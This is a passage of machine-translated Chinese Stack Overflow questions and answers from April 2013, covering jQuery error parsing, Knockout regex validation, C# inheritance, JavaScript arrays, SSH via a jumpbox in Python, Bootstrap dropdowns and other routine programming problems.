 left bottom, from(#f4f4f4), to(#fefefe));\n\t\t\tbackground-image: -webkit-linear-gradient(top, 
 #f4f4f4, #fefefe);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:     -ms-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:      -o-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:   linear-gradient(to bottom, #f4f4f4, #fefefe);
 \n\t\t\tborder-color: #999;\n\t\t\tcolor: #333;\n\t\t\ttext-shadow: 0 -1px 0 #fff;
 \n\t\t\t-webkit-box-shadow: inset 0 2px 5px -3px rgba( 0, 0, 0, 0.5 );
 \n\t\t \tbox-shadow: inset 0 2px 5px -3px rgba( 0, 0, 0, 0.5 );\n\t\t}\n\n\t\t\t\tbody { font-family: Tahoma, Arial; }
 \n\t\t\t</style>\n</head>\n<body id=\"error-page\">\n\t<p>\u062F\u06CC\u062F\u06AF\u0627\u0647 \u062A\u06A
9\u0631\u0627\u0631\u06CC \u0634\u0646\u0627\u0633\u0627\u06CC\u06CC \u0634\u062F\u061B \u0634\u0645\u0627 
\u067E\u06CC\u0634 \u0627\u0632 \u0627\u06CC\u0646 \u0647\u0645 \u0686\u0646\u06CC\u0646 \u0686\u06CC\u0632\u06CC 
\u06AF\u0641\u062A\u0647 \u0628\u0648\u062F\u06CC\u062F!</p></body>\n</html>\n" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:50:58.587

解析 html，然后导航到您的目标内容。你想要`p`元素里面的东西吗？

```
alert($($.parseHTML(error.responseText)).filter("p").text()); 
```

[http://jsfiddle.net/4VmV2/](http://jsfiddle.net/4VmV2/)

# opencl - (Py)OpenCL：将浮点数添加到图像中随机位置的最快方法？

> ID：15772703
> 
> 赞同：1
> 
> 时间：2013-04-02T19:29:48.977
> 
> 标签：opencl, raytracing, pyopencl

*更新了不同的问题描述。我之前的问题建议的双向路径跟踪不是一种选择。*

我有一个使用 OpenCL 进行一些计算（物理模拟）的 Monte Carlo 代码。主机代码是用 Python 和 PyOpenCL 编写的。OpenCL 内核的最终结果是图像（检测器数据）的坐标元组（x,y 位置 + 强度/灰度值）。我有 3 个向量/一维数组（x 位置、y 位置和灰度值各一个）。每个一维数组大约有 1e6 到 1e8 个整数，其中 x,y 是整数，灰度值浮动。要创建的图像是几个 1000x1000 像素（1e6 到 1e7 像素）。
最终，我需要在每次运行时创建多个图像（每个图像具有不同的坐标元组），因此效率和低内存使用变得很重要。

从这些数据生成二维数组或图像的最快方法是什么？对同一位置 (x,y) 的多次写入确实发生了，我找不到一个好的解决方案来并行或在模拟期间执行此操作（因为可能同时写入图像中的同一位置）。

我目前所做的是将 3 个向量/一维数组复制回主机，并使用内联 C 函数在主机上串行生成图像。

代码中最耗时的部分是为 3 个一维数组创建输出缓冲区数组，然后在内核完成后从设备复制到主机。如果我可以：
i）将数据保存在设备上并使用第二个内核（经过测试，但如果串行完成会非常慢）
生成图像，或者我可以在内核中生成图像正在运行，因此总体上摆脱了 1D 数组。

ii) 是首选，但我不知道该怎么做。write_image 是否识别多个工作项是否要写入同一个数组索引？
我已经测试并行化 i) 通过为两个工作组生成 2 个独立的 2D 图像数组，每个工作组有 1 个工作项，每个项迭代超过 1D 向量的一半（工作），但是对于更多工作项和独立图像，创建额外的开销2D 数组耗时太长并且消耗太多内存。

任何想法表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T04:23:33.640

Python 不适用于高性能应用程序，尤其是当它涉及循环时——类似于 Matlab。

~~但是如果你想坚持使用 Python 并并行化你的代码，最好的方法是使用 PyCuda，你可以每个像素有一个线程并在 GPU 上运行计算。~~

请注意，最有效的光线追踪是*向后*光线追踪，它将光线从相机发送到场景（例如，每个像素一条光线），这样您就可以确保不会浪费原本永远不会到达相机的光线。也许在尝试并行化代码之前的第一件事是理解和实现更有效的算法。

如果您想要全局效果，您可以查看（双向）路径跟踪和照片映射。

# knockout.js - 使用正则表达式验证电话号码的淘汰赛验证

> ID：15772708
> 
> 赞同：7
> 
> 时间：2013-04-02T19:29:55.827
> 
> 标签：knockout.js, knockout-validation

我正在尝试使用 Knockout-Validation 向我的一个可观察对象添加一个简单的正则表达式验证。

我有以下内容：

```
self.ContactPhone = ko.observable().extend({
            required: true,
            pattern: {
                message: 'Invalid phone number.',
                params: '^\D?(\d{3})\D?\D?(\d{3})\D?(\d{4})$'
            }
        }); 
```

但是，无论我输入什么，它都会返回消息“无效的电话号码”。我需要以某种方式格式化表达式吗？我已经使用纯 JavaScript 对其进行了测试，并且效果很好。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-03T04:30:51.210

您需要转义反斜杠，否则 javascript 会将您的一个反斜杠本身视为下一个字符的转义字符。这是因为这是一个字符串，而不是正则表达式文字。

编辑：实际上我刚刚检查过，你可以只使用正则表达式文字，所以这些都可以做到：

[http://jsfiddle.net/antishok/ED3Mh/2/](http://jsfiddle.net/antishok/ED3Mh/2/)

```
self.ContactPhone = ko.observable().extend({
    required: true,
    pattern: {
        message: 'Invalid phone number.',
        params: /^\D?(\d{3})\D?\D?(\d{3})\D?(\d{4})$/            
    }
}); 
```

或者：

```
params: '^\\D?(\\d{3})\\D?\\D?(\\d{3})\\D?(\\d{4})$' 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-03-07T19:33:23.313

如果您不必使用正则表达式，这是本机方式

```
self.ContactPhone = ko.observable().extend({ phoneUS : true }); 
```

[更多在这里](http://mikedormitorio.azurewebsites.net/BlogPost/the-native-validation-rules-of-knockout-validation)列出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-30T10:05:58.897

请参阅 jsfiddle 中的以下工作示例，使用允许空格和 + and() 的正则表达式以及链接后面的数字

jsfiddle.net/JoelDerrick/f6g8npv6/1/

# glassfish-3 - Glassfish 3 更新工具 (pkg) 未安装：不是 GZIP 格式

> ID：15772715
> 
> 赞同：3
> 
> 时间：2013-04-02T19:30:36.830
> 
> 标签：glassfish-3

我在 Windows 上运行 java 6。我刚刚使用 exe 安装了 glassfish 3.1.2.2，并在安装过程中选择不安装域。然后我尝试运行 pgk 工具，发现我必须安装它。起初它没有工作，由于 404。我在这里找到了答案[http://java.net/jira/browse/GLASSFISH-18884](http://java.net/jira/browse/GLASSFISH-18884)）这个问题（必须编辑cfg_cache）。然后我尝试再次运行它，但现在我看到了：

输入/输出错误：不是 GZIP 格式

这是完整的输出。

C:\opt\glassfish3\bin> .\updatetool

未安装此命令所需的软件 (updatetool)。

如果您选择安装更新工具，您的系统将自动配置为定期检查软件更新。如果您想将该工具配置为不检查更新，您可以通过该工具的首选项工具覆盖默认行为。

当此工具与软件包存储库交互时，一些系统信息（例如系统的 IP 地址和操作系统类型和版本）会发送到存储库服务器。欲了解更多信息，请参阅：

[http://wikis.oracle.com/display/updatecenter/UsageMetricsUC2](http://wikis.oracle.com/display/updatecenter/UsageMetricsUC2)

安装完成后，您可以重新运行此命令。

您想现在安装更新工具吗（y/n）：y

C:\opt\glassfish3\bin>"C:\Program Files (x86)\Java\jdk1.6.0_32\bin\java" -Dimage.path="C:\opt\glassfish3\bin\.." -jar "C:\opt\glassfish3\bin\..\pkg/lib/pkg-bootstrap.jar" "C:\Users\NEUMEI~1\AppData\Local\Temp\pkg-bootstrap5312.props" 代理：使用系统代理设置。安装映像：C:\opt\glassfish3 安装 pkg 包。下载2个包。下载 pkg（514 个文件，6,463,109 字节）。文件 514/514 正在下载 python2.4-minimal（278 个文件，3,828,949 字节）。文件 278/278 执行 906 安装操作。输入/输出错误：不是 GZIP 格式

无法下载应用程序包。这可能是因为： - 需要代理服务器来访问互联网。请确保您的 Internet 选项控制面板（连接：LAN 设置下）中的系统代理服务器设置正确，或将 HTTP_PROXY 环境变量设置为代理服务器的完整 URL。- 包服务器或网络连接速度很慢。如果您遇到超时错误，您可以尝试设置 PKG_CLIENT_CONNECT_TIMEOUT 和 PKG_CLIENT_READ_TIMEOUT 环境变量，然后重试。例如，要将超时时间增加到 300 秒，请将它们设置为 300 - 包服务器已关闭或无法访问，或者正在生成无效数据。请联系包服务器的提供商。

# vb.net - 使用 vb.net 或 C# 下载文件

> ID：15772719
> 
> 赞同：1
> 
> 时间：2013-04-02T19:30:51.307
> 
> 标签：vb.net, download

此代码允许我使用 vb.net 从 Internet 下载文件：

```
If My.Computer.Network.IsAvailable Then
   DownloadClient = New WebClient
   Dim Url As New Uri("http://www.domain.com/download")
   DownloadClient.DownloadFileAsync(Url,"C:\file.ext")
End If 
```

但是有时链接需要重定向到下载文件的链接的问题，那么有没有办法获取下载文件的名称来使用它来代替file.ext！谢谢 ：）

# html - 有没有办法让 A SET 单选按钮在单击时失去焦点？

> ID：15772723
> 
> 赞同：0
> 
> 时间：2013-04-02T19:30:59.793
> 
> 标签：html

我有一个包含大约 10 个问题的网页，由 ABCD 答案组成。每个 ABCD 都有自己的单选按钮，后面跟着答案。

如果单击一个单选按钮，则可以使用向上/向下箭头键滚动答案。我希望禁用此功能，因为我的某些页面每页包含 50 个答案。

任何帮助或想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:36:20.843

解决方案之一是创建那些未分组的单选按钮。比您必须编写一些 javascript 来自行实现分组，因此当您选择一个单选按钮时，您组中的其他单选按钮将被取消选择。当单选按钮未分组（不同的名称属性）时，您无法使用向上/向下键导航它们。

# node.js - 尝试在 Synology DS1511+ 上构建 nodejs 时不断出现错误

> ID：15772724
> 
> 赞同：1
> 
> 时间：2013-04-02T19:31:00.663
> 
> 标签：node.js, synology

我已经尝试了很长一段时间将 node.js 构建到我的 Synology DS1511+ 上。我已经阅读[了本教程以及评论](http://www.gridshore.nl/2011/04/04/installing-node-js-on-my-new-synology/)，但我仍然遇到了一个奇怪的错误，我无法弄清楚如何构建它。在我运行`sudo make`它之后，构建运行良好大约 15 到 20 分钟，但后来我得到了这个：

```
/volume1/homes/admin/node/out/../deps/uv/src/unix/thread.c:286: undefined reference to `pthread_condattr_setclock'
collect2: ld returned 1 exit status
make[1]: *** [/volume1/homes/admin/node/out/Release/node] Error 1
make[1]: Leaving directory `/volume1/homes/admin/node/out'
make: *** [node] Error 2 
```

从错误来看，它似乎与pthread库有关，但我真的不知道是不是这样，特别是因为我根据教程更换了pthread库。顺便说一句，本教程展示了如何为基于 ARM 的处理器构建节点，但我正在构建的 Synology 是 i686。

任何人都知道如何在 DS1511+ 上构建 node.js 来克服这个问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-30T11:56:08.607

我刚刚遇到了同样的问题。似乎默认的 glibc libpthread.so （这是在 RHEL 4 上）不包括 pthread_condattr_setclock （即使手册页说它应该这样做并且包含文件也指定了它），我快速浏览了一下，发现 nosgneg版本（来自同一个 glibc 包）确实具有此功能。我不确定这意味着什么，但是在我为节点运行配置之后，我破解了 pyg (out/node.target.mk) 脚本，看起来像：

```
LDFLAGS_Debug := \
    -L/lib/tls/i686/nosegneg/ -lpthread-2.3.4 \
    -rdynamic \
    -m32 \
    -pthread

LDFLAGS_Release := \
    -L/lib/tls/i686/nosegneg/ -lpthread-2.3.4 \
    -rdynamic \
    -m32 \
    -pthread   

LIBS := \
    -lc-2.3.4 \
    -lm-2.3.4 \ 
    -ldl \
    -lrt-2.3.4 
```

其中 2.3.4 是我们当前的 glibc 版本。现在节点编译得很好。将不得不做一些测试，看看它是否运行正常。

# flash - Fancybox 2 - SWF 背景颜色不起作用

> ID：15772725
> 
> 赞同：0
> 
> 时间：2013-04-02T19:31:21.033
> 
> 标签：flash, fancybox-2

我刚刚更新到 Fancybox 2，我的 flash 动画不再有背景颜色。这是我用于 Fancybox 1 的代码，它不再有效。

```
 $("#myFlashFile").fancybox({
    'width' : '650',
    'height' : '620',
    'autoScale' : false,
    'transitionIn' : 'fade',
    'transitionOut' : 'fade',
    'speedIn' : 800, 
    'speedOut' :    200,                
    'type' : 'swf',
    'wmode' : 'opaque',
    'swf' : {bgcolor:'#ffcc00'},
    'overlayShow' : true,
    }); 
```

在 Fancybox 1 中调用背景颜色的行是：

```
'swf' : {bgcolor:'#ffcc00'} 
```

**编辑** 我将 'swf' : {bgcolor:'#ffcc00'} 替换为

```
 'beforeShow': function(){
            $(".fancybox-skin").css("backgroundColor","#ffcc00");
                } 
```

现在可以了。最终代码如下所示：

```
 $("#myFlashFile").fancybox({
    'padding'   :   6,          
    'width' : '650',
    'height' : '620',
    'autoScale' : false,
    'openEffect': 'fade',
    'prevEffect': 'fade',
    'nextEffect': 'fade',
    'openSpeed'   : 300,
    'closeSpeed'   : 200,       
    'type' : 'swf',
    'wmode' : 'opaque',
    'beforeShow': function(){
            $(".fancybox-skin").css("backgroundColor","#ffcc00");
                }       
     }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-01T03:20:21.733

我遇到了同样的问题，所以我只是更改了`jquery.fancybox.js`文件中的默认值。从：

```
swf : {
    wmode: 'transparent',
    allowfullscreen   : 'true',
    allowscriptaccess : 'always'
}, 
```

至：

```
swf : {
    wmode: 'opaque',
    allowfullscreen   : 'true',
    allowscriptaccess : 'always'
}, 
```

像魅力一样工作！

# c# - c# 字段永远不会分配给并且总是将其默认值 null？

> ID：15772733
> 
> 赞同：0
> 
> 时间：2013-04-02T19:31:37.117
> 
> 标签：c#, class, inheritance, compiler-errors

C# 继承。我正在尝试将类四边形继承到类 sqaure。我无法弄清楚这一点，我收到以下错误，我不知道这意味着什么。字段 square.p1 从未分配给并且将始终具有其默认值 null？

```
 using System;

    class testquadrilaterals 
    {
        static void Main() 
{
    quadrilateral obj1 = new quadrilateral(1.1, 1.2, 6.6, 2.8, 6.2, 9.9, 2.2, 7.4);
    obj1.printcoordinates();
    Console.WriteLine("\n");
    square obj2 = new square( 4.0, 0.0, 8.0, 0.0, 8.0, 4.0, 4.0, 4.0 );
    obj2.printsquare();

    Console.ReadLine();
}
    }

    class point 
    {
        private double x;
private double y;

public point(double x_coord, double y_coord)
{
    x = x_coord;
    y = y_coord;
}

public double X { get { return x; } set { x = value; } }
public double Y { get { return y; } set { y = value; } }

public override string ToString()
{
    return ("(" + X + ", " + Y + ")");
}
    }

    class quadrilateral
    {
point p1, p2, p3, p4;

public quadrilateral(double x1, double y1, double x2, double y2,
    double x3, double y3, double x4, double y4)
{
    p1 = new point(x1, y1);
    p2 = new point(x2, y2);
    p3 = new point(x3, y3);
    p4 = new point(x4, y4);
}

public point P1 { get { return p1; } set { p1 = value; } }
public point P2 { get { return p2; } set { p2 = value; } }
public point P3 { get { return p3; } set { p3 = value; } }
public point P4 { get { return p4; } set { p4 = value; } }

public void printcoordinates()
{
    Console.WriteLine("Coordinates of Quadrilateral: \n" + p1.ToString() + " " + p2.ToString() + " " + p3.ToString() + " " + p4.ToString() + " ");
}
    }

    class square : quadrilateral
    {
point p1, p2, p3, p4;

public square(double x1, double y1, double x2, double y2,
    double x3, double y3, double x4, double y4) : base (x1, y1, x2, y2, x3, y3, x4, y4)
{ }

public void printsquare()
{
    Console.WriteLine("Coordinates of Square: \n" + p1.ToString() + " " + p2.ToString() + " " + p3.ToString() + " " + p4.ToString() + " ");
    Console.WriteLine("Area: " + area());
   // Console.WriteLine("Sides: " + sides());
}

public double area() 
{

    return Math.Abs(p1.X - p2.X) * Math.Abs(p1.Y - p3.Y); 
}
// public double sides() { } 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:34:36.663

在这种情况下，该类`square`定义了 4 个它从不设置的字段：p1、p2、p3 和 p4

```
class square : quadrilateral {
  point p1, p2, p3, p4;

  ...
} 
```

这些字段是私有的，从不设置，因此它们本质上是无用的。C# 编译器会提醒您注意这一点，因为这通常表明存在错误。

在这种情况下，看起来您可能打算`square`简单地使用`quadrilateral`. 字段具有相同的名称和类型，并且两种类型之间存在继承关系。如果是这种情况，您应该删除字段`square`并将可访问性更改`protected`为`quadrilateral`

```
class quadrilateral {
  protected  point p1, p2, p3, p4;
  ...
} 
```

这将允许`square`访问值

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:33:59.900

如果您从四边形继承，则不需要在正方形中再次定义变量 p1/p2/p3/p4，您将从基类继承它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:35:14.850

在 Square::area() 中，p1s 和 p2s 是指在 square 类中定义的那些，而不是在 quadrilateral 类中定义的那些。您同时拥有 square::p1、square::p2 等和四边形 ::p1、quadrilateral::p2 等。正方形 p1s 和 p2s 永远不会分配给。要让您的正方形类使用四边形类的 p1s 和 p2s，请不要在正方形中重新定义它们。

# javascript - 尝试从数组中添加和删除项目

> ID：15772736
> 
> 赞同：1
> 
> 时间：2013-04-02T19:31:44.417
> 
> 标签：javascript, arrays, add

该脚本通过要求用户添加或删除数组中的项目来工作。然后要求继续这个循环。这里的问题是我的脚本似乎与我的用户输入 (removeItem) 与列表中的项目 (myList[i]) 不匹配。我不知道为什么这不匹配。

```
// new method for removing specific items from a list
Array.prototype.remove = function(from,to) {
    var rest = this.slice((to || from) + 1 || this.length);
    this.length = from < 0 ? this.length + from : from;
    return this.push.apply(this, rest);
};

printList = function() {
    var listLength = myList.length;
    for (i = 0; i < listLength; i++) {
        document.write(i + ":");
        document.write(myList[i] + "<br/>");
    };
    document.write("<br/><br/>");
};

// initial list
var myList = new Array ();
if (myList.length === 0) {
    document.write("I have " + myList.length + " item in my list. It is: <br/>");
}
else {
    document.write("I have " + myList.length + " items in my list. They are: <br/>");
}
printList();

var continueAdding = "yes";
var askToContinue = "";

while (continueAdding === "yes") {
    // loop
    var askUser = prompt("What do you want to [A]dd or [R]emove an item to your inventory?").toUpperCase();
    switch (askUser) {
        case "A": { // add an user specified item to the list
            var addItem = prompt("Add something to the list");
            myList.push(addItem);
            printList();
            break;
        }
        case "R": { // remove an user specified item from the list
            var removeItem = prompt("what do you want to remove?"); 
            var listLength = myList.length;
            for (i = 0; i < listLength; i++) {
                if (removeItem === myList[i]) {
                    document.write("I found your " + removeItem + " and removed it.<br/>");
                    myList.remove(i);
                }
                else {
                    document.write(removeItem + " does not exist in this list.<br/>");
                    break;
                }
                if (myList.length === 0) {
                    myList[0] = "Nada";
                }
            };
            printList();
            break;
        }
        default: {
            document.write("That is not a proper choice.");
        }
    };

    askToContinue = prompt("Do you wish to continue? [Y]es or [N]o?").toUpperCase(); // ask to continue
    if (askToContinue === "Y") {
        continueAdding = "yes";
    }
    else {
        continueAdding = "no";
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:37:58.103

您的循环永远不允许它遍历所有项目，因为如果项目不匹配，它会在第一次迭代时中断。

该`break`语句应该在`if`块中，而不是在`else`块中 - 改用这个：

```
for (i = 0; i < listLength; i++) {
    if (removeItem === myList[i]) {
        document.write("I found your " + removeItem + " and removed it.<br/>");
        myList.remove(i);
        break;
    }
    else {
        document.write(removeItem + " does not exist in this list.<br/>");
    }
};

if (myList.length === 0) {
    myList[0] = "Nada";
} 
```

另外，请注意，它正在寻找*完全*匹配、区分大小写、相同的标点符号以及所有内容。如果您希望它更宽松一点，您需要修改脚本以将两个字符串转换为小写并在比较它们之前去除标点符号。

编辑：刚刚注意到其他事情 - 需要在循环之外完成对空列表的测试。我更新了上面的代码以反映这一点。

# c# - 将浮点数修整到某个小数点

> ID：15772740
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:31:50.600
> 
> 标签：c#

我需要一种将浮点数向下舍入到特定小数位数的方法。`Math.Round`如果剪切后的数字大于 6，将四舍五入，并且`Math.Floor`不适用于小数位。

基本上，如果我有`2.566321`，我希望代码返回`2.56`。我知道可以做到这一点的唯一方法是将浮点数转换为字符串并使用`string.format`，但如果可能的话，我宁愿不这样做。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:40:41.427

蛮力的方法可能是乘以 10^n ，其中`n`是您想要的小数位数，转换为 int （截断而不是舍入），然后转换回浮点数并再次除以 10^n。

视觉上：

```
2.566321 * 10^2 = 2.566321 * 100 = 256.6321

(int) 256.6321 = 256

(float) 256 / 10^2 = (float) 256 / 100 = 2.56 
```

快速尝试代码：

```
public float Truncate(float value, int decimalPlaces) {
   int temp = (int) (value * Math.Pow(10, decimalPlaces));
   return (float) temp / Math.Pow(10, decimalPlaces);
} 
```

我还没有测试过这个，但这应该让你去。

# c# - 使用c#在文件中动态搜索

> ID：15772742
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:32:03.500
> 
> 标签：c#, string, search, arraylist, textchanged

/*我正在读取许多文件并通过`File.ReadAllLines`. 现在我想在这些文件中搜索在文本框中写入的特定字符串。每当我在文本框中输入一些文本时，它必须返回包含该单词的文本行。我在 textchanged 属性中进行编码，但它并不成功，因为即使我按下退格键或添加任何其他单词，它也会给我一个结果。*/

```
I have successfully made it to work. I was clearing the listbox every time it runs else statement. Now I just want you people to tel me what should I do to make it work fast. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:47:37.177

如果您不想在输入内容时立即获得结果，请输入`Textbox`表单`Button`并尝试以下代码：

```
string[] lines=File.ReadAllLines(path);
var result = lines.Where(l => l.Contains("text")).ToList(); 
```

我希望这有帮助

# javascript - 想在较小的窗口中保持下拉菜单的状态

> ID：15772745
> 
> 赞同：0
> 
> 时间：2013-04-02T19:32:22.240
> 
> 标签：javascript, jquery, html, css, twitter-bootstrap

我正在为我的导航栏使用 twitter 引导程序...当我缩小浏览器窗口时，您可以在顶部看到一个按钮....当您单击该按钮时，您会看到一个下拉菜单....但是当我单击下拉菜单内的链接..它会转到另一个页面...但是下拉菜单会崩溃..即使它移动到另一个页面，如何保持下拉菜单的状态.. ..

```
!function ($) {

  "use strict"; // jshint ;_;

 /* DROPDOWN CLASS DEFINITION
  * ========================= */

  var toggle = '[data-toggle=dropdown]'
    , Dropdown = function (element) {
        var $el = $(element).on('click.dropdown.data-api', this.toggle)
        $('html').on('click.dropdown.data-api', function () {
          $el.parent().removeClass('open')
        })
      }

  Dropdown.prototype = {

    constructor: Dropdown

  , toggle: function (e) {
      var $this = $(this)
        , $parent
        , isActive

      if ($this.is('.disabled, :disabled')) return

      $parent = getParent($this)

      isActive = $parent.hasClass('open')

      clearMenus()

      if (!isActive) {
        $parent.toggleClass('open')
      }

      $this.focus()

      return false
    }

  , keydown: function (e) {
      var $this
        , $items
        , $active
        , $parent
        , isActive
        , index

      if (!/(38|40|27)/.test(e.keyCode)) return

      $this = $(this)

      e.preventDefault()
      e.stopPropagation()

      if ($this.is('.disabled, :disabled')) return

      $parent = getParent($this)

      isActive = $parent.hasClass('open')

      if (!isActive || (isActive && e.keyCode == 27)) {
        if (e.which == 27) $parent.find(toggle).focus()
        return $this.click()
      }

      $items = $('[role=menu] li:not(.divider):visible a', $parent)

      if (!$items.length) return

      index = $items.index($items.filter(':focus'))

      if (e.keyCode == 38 && index > 0) index--                                        // up
      if (e.keyCode == 40 && index < $items.length - 1) index++                        // down
      if (!~index) index = 0

      $items
        .eq(index)
        .focus()
    }

  }

  function clearMenus() {
    $(toggle).each(function () {
      getParent($(this)).removeClass('open')
    })
  }

  function getParent($this) {
    var selector = $this.attr('data-target')
      , $parent

    if (!selector) {
      selector = $this.attr('href')
      selector = selector && /#/.test(selector) && selector.replace(/.*(?=#[^\s]*$)/, '') //strip for ie7
    }

    $parent = selector && $(selector)

    if (!$parent || !$parent.length) $parent = $this.parent()

    return $parent
  }

  /* DROPDOWN PLUGIN DEFINITION
   * ========================== */

  var old = $.fn.dropdown

  $.fn.dropdown = function (option) {
    return this.each(function () {
      var $this = $(this)
        , data = $this.data('dropdown')
      if (!data) $this.data('dropdown', (data = new Dropdown(this)))
      if (typeof option == 'string') data[option].call($this)
    })
  }

  $.fn.dropdown.Constructor = Dropdown

 /* DROPDOWN NO CONFLICT
  * ==================== */

  $.fn.dropdown.noConflict = function () {
    $.fn.dropdown = old
    return this
  }

  /* APPLY TO STANDARD DROPDOWN ELEMENTS
   * =================================== */

  $(document)
    .on('click.dropdown.data-api', clearMenus)
    .on('click.dropdown.data-api', '.dropdown form', function (e) { e.stopPropagation() })
    .on('click.dropdown-menu', function (e) { e.stopPropagation() })
    .on('click.dropdown.data-api'  , toggle, Dropdown.prototype.toggle)
    .on('keydown.dropdown.data-api', toggle + ', [role=menu]' , Dropdown.prototype.keydown)

}(window.jQuery); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:42:36.163

页面重新加载到新页面、新内容（包括导航栏）等

# python - (Python) 通过跳转框连接子进程管道/运行命令

> ID：15772747
> 
> 赞同：0
> 
> 时间：2013-04-02T19:32:29.873
> 
> 标签：python, command, subprocess

所以我想使用 python 在服务器上运行命令，但要做到这一点，我必须通过另一个框。我通过子进程运行 ssh 连接到第一个盒子。但是，我不确定如何进入第二个框并通过该子进程对象运行命令。

我的子流程声明：

```
command = "ssh servername"
sshConnection = subprocess.Popen(command.split(),stderr=subprocess.PIPE
                                  ,stdout=subprocess.PIPE,stdin=subprocess.PIPE) 
```

我能想到的唯一方法：

以某种方式连接两个子进程命令的管道？先建立一个SSH隧道然后通过它运行命令？还有其他想法吗？我接近这个错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:41:20.300

如果“通过另一个盒子”，您的意思是“启动从 jumpbox 到服务器的 ssh 连接”，请尝试：

```
command = "ssh jumpbox ssh servername /bin/ls -l"
sshConnection = subprocess.Popen(command.split(),stderr=subprocess.PIPE
                              ,stdout=subprocess.PIPE,stdin=subprocess.PIPE) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:36:08.760

怎么样：

```
cmd = "mycmd myarg1 myarg2"
ssh_command = "ssh servername %s" % cmd
sshConnection = subprocess.Popen(ssh_command.split(),stderr=subprocess.PIPE
                                  ,stdout=subprocess.PIPE,stdin=subprocess.PIPE) 
```

当然，如果命令包含特殊字符，您还需要对命令进行 shell 转义。

我个人喜欢一个更光滑的选择，是使用[铅](http://plumbum.readthedocs.org/en/latest/remote.html#guide-remote-commands)。您可以嵌套远程 (ssh) 命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T23:34:41.203

由于您正在使用子进程执行大量 ssh，我建议您应该使用[Fabric](http://fabric.readthedocs.org/en/latest/index.html)

# voicexml - voicexml 中的近似匹配

> ID：15772748
> 
> 赞同：0
> 
> 时间：2013-04-02T19:32:29.950
> 
> 标签：voicexml

不知道这里能不能得到答案……我要解决的问题是：系统监听用户的输入，判断用户的输入是否包含“循环”这个词。

VoiceXML 是否支持此类任务的语法？它似乎只能从列出的单词中提取单词。用户可以说：使用循环、循环、for循环、遍历数组……有没有办法让我只考虑句子是否包含“循环”？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:39:28.657

您可以创建自己的语法并附加到您的领域：

```
<field name="loopField">
    <prompt>What's your way to say loop?</prompt>
    <grammar src="mygrammar.gram" type="application/srgs+xml" />
    <help> Please say your employee number. </help>
</field> 
```

[在此处](http://www.w3.org/TR/speech-grammar/)查看有关 W3C 语法的更多信息

# unity3d - 有没有办法给 Unity3d 项目加水，可与移动平台兼容

> ID：15772756
> 
> 赞同：0
> 
> 时间：2013-04-02T19:32:59.190
> 
> 标签：unity3d, unityscript

我正在开发一个[Unity3D](http://unity3d.com/)项目，我有[Unity Pro](http://unity3d.com/unity/licenses)，它带有 water4。我意识到如果我正在尝试制作可在移动设备上运行的游戏，我将无法使用它。有没有人有想法或方法让水（并允许它移动）看起来更逼真，然后只是简单地在地形上绘制它并且不会在移动设备上崩溃游戏。我也在 unityscript 中创建脚本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:35:17.877

这个水包看起来不错，适用于移动设备，非专业版，在 Asset store 上。

[http://u3d.as/content/grespon/easy-water/2Q8](http://u3d.as/content/grespon/easy-water/2Q8)

# asp.net - 阿拉伯语/英语文本被洗牌

> ID：15772759
> 
> 赞同：2
> 
> 时间：2013-04-02T19:33:03.743
> 
> 标签：asp.net, textbox, arabic

我遇到了一个奇怪的问题，我有一个文本框，我正在尝试阅读文本。但是当文本框同时包含阿拉伯文和英文文本时，似乎文本被打乱了。这就是我从文本框中读取文本的方式：

```
string temp = input.Text; 
```

这是我在文本框中插入的文本：

> باهم 和 englishمتن فارسی

这是我从文本框中得到的文本：

> متن فارسی 和英语 باهم

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:36:06.133

阿拉伯语是从右到左的语言。英语从左到右。所以这实际上是正确的——屏幕上的阿拉伯语顺序相反（字符串位置 0 将在最右边）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T08:13:08.580

这可能不是 ASP.NET 的问题，而是它输出的 HTML 的问题。

检查浏览器中的 HTML 元素并检查计算样式中的“direction”属性。如果输入框的主要语言是阿拉伯语或波斯语，则应为“rtl”，如果是英语，则应为“ltr”。如果是另一种方式，则需要通过在 HTML 元素上使用适当的 dir 属性来调整它。

这仅针对用户界面进行调整。文本可能没有以正确的方向保存到您的数据库中，但这可能没问题，因为数据库是内部的，用户通常看不到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-03T08:23:53.963

在文本开头添加 RLE 字符。

```
const char RightToLeftEmbedding = (char)0x202B; 
```

# javascript - 从电子邮件链接创建弹出窗口而不使用自定义 javascript

> ID：15772760
> 
> 赞同：2
> 
> 时间：2013-04-02T19:33:03.837
> 
> 标签：javascript, dom, popup

我正在发送一封包含链接的电子邮件。当收件人单击该链接时，我希望在单击时弹出结果页面（而不是在新选项卡中打开）。

我使用 Gmail 作为我的参考邮件客户端。

